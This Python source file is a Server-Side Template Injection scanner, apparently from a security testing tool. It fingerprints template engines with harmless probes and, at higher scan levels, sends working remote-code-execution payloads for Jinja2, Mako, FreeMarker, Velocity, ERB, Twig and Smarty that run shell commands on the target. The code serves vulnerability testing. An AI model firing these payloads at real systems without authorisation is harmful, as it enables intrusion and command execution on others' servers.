#!/usr/bin/env python3
"""
SSTI Scanner — Server-Side Template Injection detection.

Probes all major template engines: Jinja2/Flask, Mako, FreeMarker, Twig,
Smarty, Pebble, ERB, Velocity, Thymeleaf, Dust.js, Handlebars.

Detection strategy:
  1. Math-expression probes  → engine evaluates ${7*7} → "49"
  2. String-operation probes → confirms engine family
  3. RCE probes (level 2+)   → payload file read / os.system('id')
"""

from __future__ import annotations

import re
import socket
import ssl
import time
import urllib.parse
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, List, Optional, Tuple

# ── Payload directory ────────────────────────────────────────────────────
_PAYLOADS_DIR = Path(__file__).parent.parent / "payloads" / "ssti"


# ── Result types ─────────────────────────────────────────────────────────

@dataclass
class SSTIFinding:
    engine: str
    payload: str
    param: str
    url: str
    evidence: str
    severity: str = "critical"
    rce_confirmed: bool = False
    method: str = "GET"
    response_snippet: str = ""


@dataclass
class SSTIResult:
    vulnerable: bool = False
    findings: List[SSTIFinding] = field(default_factory=list)
    engines_detected: List[str] = field(default_factory=list)
    requests: int = 0
    target: str = ""
    error: str = ""


# ── Probe definitions ─────────────────────────────────────────────────────
# Format: (engine_name, probe_payload, expected_output_regex)
# Math probes: inject 7*7 → expect "49"
# String probes: inject "fray"|upper → expect "FRAY"

_PROBES: List[Tuple[str, str, str]] = [
    # ── Jinja2 / Flask ──
    ("Jinja2",     "{{7*7}}",                              r"\b49\b"),
    ("Jinja2",     "{{7*'7'}}",                            r"7777777"),
    ("Jinja2",     "{{'fray'|upper}}",                     r"FRAY"),
    ("Jinja2",     "{{config.__class__}}",                 r"class.*Config|NoneType|dict"),

    # ── Twig (PHP) ──
    ("Twig",       "{{7*7}}",                              r"\b49\b"),
    ("Twig",       "{{'fray'|upper}}",                     r"FRAY"),
    ("Twig",       "{{app}}",                              r"Twig|Application|Symfony"),

    # ── Smarty (PHP) ──
    ("Smarty",     "{$smarty.version}",                    r"3\.\d+\.\d+|Smarty"),
    ("Smarty",     "{7*7}",                                r"\b49\b"),
    ("Smarty",     "{'fray'|strtoupper}",                  r"FRAY"),

    # ── Mako (Python) ──
    ("Mako",       "${7*7}",                               r"\b49\b"),
    ("Mako",       "${'fray'.upper()}",                    r"FRAY"),

    # ── FreeMarker (Java) ──
    ("FreeMarker", "${7*7}",                               r"\b49\b"),
    ("FreeMarker", "${\"fray\"?upper_case}",               r"FRAY"),
    ("FreeMarker", "${.version}",                          r"\d+\.\d+\.\d+"),

    # ── Pebble (Java) ──
    ("Pebble",     "{{'fray'|upper}}",                     r"FRAY"),
    ("Pebble",     "{{7*7}}",                              r"\b49\b"),

    # ── Velocity (Java) ──
    ("Velocity",   "#set($x=7*7)${x}",                    r"\b49\b"),
    ("Velocity",   "$math.mul(7,7)",                       r"\b49\b"),

    # ── ERB (Ruby) ──
    ("ERB",        "<%= 7*7 %>",                           r"\b49\b"),
    ("ERB",        "<%= 'fray'.upcase %>",                 r"FRAY"),

    # ── Thymeleaf (Java/Spring) ──
    ("Thymeleaf",  "[[${7*7}]]",                           r"\b49\b"),
    ("Thymeleaf",  "__${7*7}__::.x",                       r"\b49\b"),

    # ── Handlebars (Node.js) ──
    ("Handlebars", "{{#with \"fray\" as |x|}}{{x}}{{/with}}", r"fray"),

    # ── Tornado / Python ──
    ("Tornado",    "{% raw 7*7 %}",                        r"\b49\b"),
    ("Tornado",    "{{7*7}}",                              r"\b49\b"),
]

# RCE probes — only sent at level >= 2
_RCE_PROBES: List[Tuple[str, str, str]] = [
    ("Jinja2",
     "{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()[0].strip()}}",
     r"uid=\d+"),
    ("Jinja2",
     "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
     r"uid=\d+"),
    ("Mako",
     "${__import__('os').popen('id').read()}",
     r"uid=\d+"),
    ("FreeMarker",
     "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
     r"uid=\d+"),
    ("ERB",
     "<%= `id` %>",
     r"uid=\d+"),
    ("Velocity",
     "#set($e=\"\")#set($a=$e.getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"fray\".getClass().forName(\"[Ljava.lang.String;\")).invoke($e.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke($e),[[\"id\"]]))",
     r"uid=\d+"),
    ("Twig",
     "{{['id']|filter('system')}}",
     r"uid=\d+"),
    ("Smarty",
     "{system('id')}",
     r"uid=\d+"),
]


# ── Scanner ───────────────────────────────────────────────────────────────

class SSTIScanner:
    """Server-Side Template Injection scanner.

    Usage:
        scanner = SSTIScanner("https://example.com/search", param="q")
        result  = scanner.scan()
        if result.vulnerable:
            for f in result.findings:
                print(f.engine, f.payload, f.evidence)
    """

    def __init__(self, url: str, param: str,
                 method: str = "GET",
                 timeout: int = 8,
                 verify_ssl: bool = True,
                 level: int = 1,
                 cookie: str = "",
                 custom_headers: Optional[Dict[str, str]] = None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.level = max(1, min(level, 3))
        self.cookie = cookie
        self.custom_headers = custom_headers or {}

        parsed = urllib.parse.urlparse(url)
        self._scheme = parsed.scheme or "https"
        self._host = parsed.hostname or ""
        self._port = parsed.port or (443 if self._scheme == "https" else 80)
        self._path = parsed.path or "/"
        self._orig_query = dict(urllib.parse.parse_qsl(parsed.query))
        self._use_ssl = self._scheme == "https"
        self._requests = 0

        # Load additional payloads from the ssti payload directory
        self._file_payloads: List[Dict] = []
        self._load_file_payloads()

    def _load_file_payloads(self) -> None:
        """Load payloads from payloads/ssti/*.json"""
        if not _PAYLOADS_DIR.exists():
            return
        import json
        for pf in sorted(_PAYLOADS_DIR.glob("*.json")):
            try:
                data = json.loads(pf.read_text(encoding="utf-8"))
                plist = data.get("payloads", data) if isinstance(data, dict) else data
                if isinstance(plist, list):
                    self._file_payloads.extend(plist)
            except Exception:
                pass
        for pf in sorted(_PAYLOADS_DIR.glob("*.txt")):
            try:
                for line in pf.read_text(encoding="utf-8").splitlines():
                    s = line.strip()
                    if s and not s.startswith("#"):
                        self._file_payloads.append({"payload": s, "category": "ssti"})
            except Exception:
                pass

    def _raw_request(self, inject_value: str) -> Tuple[int, str, Dict[str, str]]:
        """Send one HTTP request with the injected payload. Returns (status, body, headers)."""
        self._requests += 1
        params = dict(self._orig_query)
        params[self.param] = inject_value

        if self.method == "GET":
            qs = urllib.parse.urlencode(params, quote_via=urllib.parse.quote)
            path = f"{self._path}?{qs}" if qs else self._path
            body_bytes = b""
            content_type = ""
        else:
            path = self._path
            body_bytes = urllib.parse.urlencode(params).encode("utf-8")
            content_type = "application/x-www-form-urlencoded"

        hdrs = {
            "Host": self._host,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,*/*",
            "Connection": "close",
        }
        if content_type:
            hdrs["Content-Type"] = content_type
        if self.cookie:
            hdrs["Cookie"] = self.cookie
        hdrs.update(self.custom_headers)

        hdr_str = "".join(f"{k}: {v}\r\n" for k, v in hdrs.items())
        if body_bytes:
            hdr_str += f"Content-Length: {len(body_bytes)}\r\n"

        if self.method == "GET":
            req = f"GET {path} HTTP/1.1\r\n{hdr_str}\r\n"
        else:
            req = f"POST {path} HTTP/1.1\r\n{hdr_str}\r\n"

        try:
            sock = socket.create_connection((self._host, self._port), timeout=self.timeout)
            if self._use_ssl:
                ctx = ssl.create_default_context()
                if not self.verify_ssl:
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                sock = ctx.wrap_socket(sock, server_hostname=self._host)

            sock.sendall(req.encode("utf-8", errors="replace"))
            if body_bytes:
                sock.sendall(body_bytes)

            resp = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
                    if len(resp) > 131072:
                        break
                except (socket.error, socket.timeout):
                    break
            sock.close()
        except Exception:
            return 0, "", {}

        resp_str = resp.decode("utf-8", errors="replace")
        status = 0
        m = re.search(r"HTTP/[\d.]+ (\d+)", resp_str)
        if m:
            status = int(m.group(1))

        resp_headers: Dict[str, str] = {}
        if "\r\n\r\n" in resp_str:
            hdr_block, body = resp_str.split("\r\n\r\n", 1)
            for line in hdr_block.splitlines()[1:]:
                if ":" in line:
                    k, v = line.split(":", 1)
                    resp_headers[k.strip().lower()] = v.strip()
        else:
            body = ""

        return status, body, resp_headers

    def _baseline(self) -> str:
        """Fetch baseline response body for comparison."""
        _, body, _ = self._raw_request("fraynoop")
        return body

    def scan(self) -> SSTIResult:
        """Run SSTI detection probes against the target."""
        result = SSTIResult(target=self.url)

        baseline = self._baseline()

        seen_engines: set = set()

        for engine, payload, expected_regex in _PROBES:
            status, body, _ = self._raw_request(payload)
            if status in (0, 400, 404, 500) and not body:
                continue
            if re.search(expected_regex, body, re.I):
                # Confirm: baseline should NOT contain the expected output
                if not re.search(expected_regex, baseline, re.I):
                    finding = SSTIFinding(
                        engine=engine,
                        payload=payload,
                        param=self.param,
                        url=self.url,
                        evidence=_snippet(body, expected_regex),
                        method=self.method,
                        response_snippet=body[:300],
                    )
                    result.findings.append(finding)
                    result.vulnerable = True
                    if engine not in seen_engines:
                        seen_engines.add(engine)
                        result.engines_detected.append(engine)

        # Level 2+: attempt RCE confirmation
        if self.level >= 2 and result.vulnerable:
            for engine, payload, expected_regex in _RCE_PROBES:
                if engine not in seen_engines:
                    continue
                status, body, _ = self._raw_request(payload)
                if re.search(expected_regex, body, re.I):
                    for f in result.findings:
                        if f.engine == engine:
                            f.rce_confirmed = True
                            f.severity = "critical"
                            f.evidence += f" | RCE: {_snippet(body, expected_regex)}"
                            break

        # Level 3: also test file payloads from payloads/ssti/
        if self.level >= 3:
            for item in self._file_payloads[:50]:
                payload_str = item.get("payload", item) if isinstance(item, dict) else str(item)
                engine_hint = item.get("subcategory", "unknown") if isinstance(item, dict) else "unknown"
                detect_str = item.get("detect", "") if isinstance(item, dict) else ""
                if not detect_str:
                    continue
                status, body, _ = self._raw_request(payload_str)
                if detect_str in body:
                    if detect_str not in baseline:
                        result.vulnerable = True
                        result.findings.append(SSTIFinding(
                            engine=engine_hint,
                            payload=payload_str,
                            param=self.param,
                            url=self.url,
                            evidence=_snippet(body, re.escape(detect_str)),
                            method=self.method,
                            response_snippet=body[:300],
                        ))

        result.requests = self._requests

        # ── Adaptive cache: save results so future scans skip blocked probes ──
        try:
            from fray.adaptive_cache import save_scan_results, _extract_domain
            _domain = _extract_domain(self.url)
            _cache_results = [
                {"payload": p, "blocked": False, "category": "ssti",
                 "bypass_confidence": 90}
                for _, p, _ in _PROBES
                if any(f.payload == p for f in result.findings)
            ]
            if _cache_results:
                save_scan_results(_cache_results, domain=_domain, waf_vendor="")
        except Exception:
            pass

        return result


def _snippet(body: str, pattern: str, context: int = 60) -> str:
    """Extract a short snippet around the first regex match."""
    m = re.search(pattern, body, re.I)
    if not m:
        return ""
    start = max(0, m.start() - context)
    end = min(len(body), m.end() + context)
    return body[start:end].strip()


def print_ssti_result(result: SSTIResult) -> None:
    """Print SSTI scan result to stdout."""
    if result.error:
        print(f"[!] Error: {result.error}")
        return
    if result.vulnerable:
        print(f"[CRITICAL] SSTI detected on {result.target}")
        print(f"  Engines: {', '.join(result.engines_detected)}")
        for f in result.findings:
            rce = " (RCE CONFIRMED)" if f.rce_confirmed else ""
            print(f"  [{f.severity.upper()}{rce}] {f.engine}: {f.payload!r}")
            print(f"    Param: {f.param}  Evidence: {f.evidence[:80]}")
    else:
        print(f"[OK] No SSTI detected on {result.target}")
    print(f"  Requests: {result.requests}")
